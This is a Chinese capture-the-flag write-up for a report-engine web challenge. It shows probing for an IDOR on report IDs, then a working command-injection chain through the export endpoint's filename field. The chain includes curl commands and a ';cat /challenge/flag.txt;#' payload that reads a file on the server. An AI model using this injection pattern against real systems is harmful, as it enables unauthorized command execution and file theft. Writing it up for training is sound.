## 题目原文

> 公司新上线的报表引擎系统，支持多用户协作生成报表。听说开发团队做了严格的权限控制，普通用户只能访问自己的报表。作为新入职的员工，你能否突破这些限制，获取到管理员私有的敏感报表数据？

题面指向「越权读管理员的私有报表」。实际上越权确实存在，但**最终拿 flag 靠的是导出功能的命令注入**。

## 题解

### 入口与指纹

`Apache/2.4.65 (Debian)` + `PHP/8.1.34`，首页是登录/注册。注册接口：

```
POST /api.php?action=register   {"username":"...","password":"..."}
POST /api.php?action=login      {"username":"...","password":"..."}
```

登录后 `dashboard.php` 加载 `assets/js/dashboard.js`，里面列出了全部接口：

```
GET  api.php?action=reports                         列表
GET  api.php?action=report&id=<id>                  详情
POST api.php?action=create_report                   新建
POST api.php?action=export                         导出（multipart）
```

### 关键观察

**1. 列表接口只返回「可见」的报表，但详情接口是 IDOR。**

注册后 `action=reports` 返回一条：

```json
{"id":2,"title":"季度财务报表","owner_id":1,"is_private":0,"owner_name":"admin"}
```

遍历 `id`：

| id | 响应 |
| --- | --- |
| 1 | `{"error":"无权访问此报表"}` |
| 2 | 正常返回 |
| 3 | `{"error":"无权访问此报表"}` |
| 4+ | `{"error":"报表不存在"}` |

`id=1` 存在但私有（管理员），`id=3` 也是别人的私有报表。**返回「无权访问」而不是「不存在」，说明记录存在、只是权限判断挡住了。**

**2. 导出接口先做权限检查，再拼 shell 命令。**

```json
POST api.php?action=export
report_id=2&filename=rep&format=txt

→ {"success":true,"file":"/uploads/rep.txt",
   "debug":{"command":"echo '报表标题: ...' > /var/www/html/uploads/rep.txt 2>&1"}}
```

`debug.command` 把拼好的整条命令打出来了，`filename` 直接进路径且没有引号包裹。这就是注入点。

**3. 权限检查在导出里同样生效，所以不用读私有报表也能拿 flag。**

`report_id=1` 导出被拒（`无权导出此报表`），但用**自己的** `report_id=2` 就能过校验，然后在 `filename` 里注入。flag 在容器文件系统里，不需要读完管理员的报表内容。

### 利用链

**Step 1：注册并登录。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -H 'Content-Type: application/json' \
  -d '{"username":"me1","password":"pass1234"}' "http://$T/api.php?action=register"

curl -s -c cj -b cj -H 'Content-Type: application/json' \
  -d '{"username":"me1","password":"pass1234"}' "http://$T/api.php?action=login"
```

**Step 2：确认 IDOR 只是「存在但无权」，并确认导出能执行命令。**

```bash
# 自己的报表
curl -s -b cj -X POST -F 'report_id=2' -F 'filename=rep' -F 'format=txt' \
  "http://$T/api.php?action=export"
# {"success":true,...,"debug":{"command":"echo '...' > /var/www/html/uploads/rep.txt 2>&1"}}
```

**Step 3：在 `filename` 里注入，读 flag。**

```bash
curl -s -b cj -X POST -F 'report_id=2' \
  --form-string 'filename=x;cat /challenge/flag.txt;#' \
  -F 'format=txt' "http://$T/api.php?action=export"
```

返回：

```json
{"debug":{"command":"echo '...' > /var/www/html/uploads/x;cat /challenge/flag.txt;#.txt 2>&1",
          "output":"flag{a4bb8e3c-f71b-460c-9503-ab98604d6221}"}}
```

`;...;#` 把 `echo ... > file` 截断成前半段，中间执行 `cat`，最后的 `#` 注释掉原本的 `.txt 2>&1` 尾巴。`output` 字段就是命令的 stdout。

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | 容器内 `/challenge/flag.txt`，通过导出功能的 `filename` 命令注入读取 |

### 复盘

- **「无权访问」和「不存在」是两个不同信号。** 前者说明记录存在，是越权/IDOR 的入口；后者才是路径或 id 错了。
- **导出/打印/转换这类功能最容易命令注入。** 它们通常用 `echo`/`tar`/`convert` 拼字符串，而且常把 `debug` 信息一起返回。
- **`debug.command` 是最友好的提示。** 它直接告诉你参数落在命令的哪个位置，省掉盲测分隔符。
- **注入不一定要在越权的那条记录上。** 权限检查只挡 `report_id`，不挡 `filename`；用自己的报表过校验，在文件名里注入即可。
- **`;...;#` 是拼接类命令注入的通用骨架**：`;` 断句、`#` 注释掉原本的尾部（这里是 `.txt 2>&1`）。
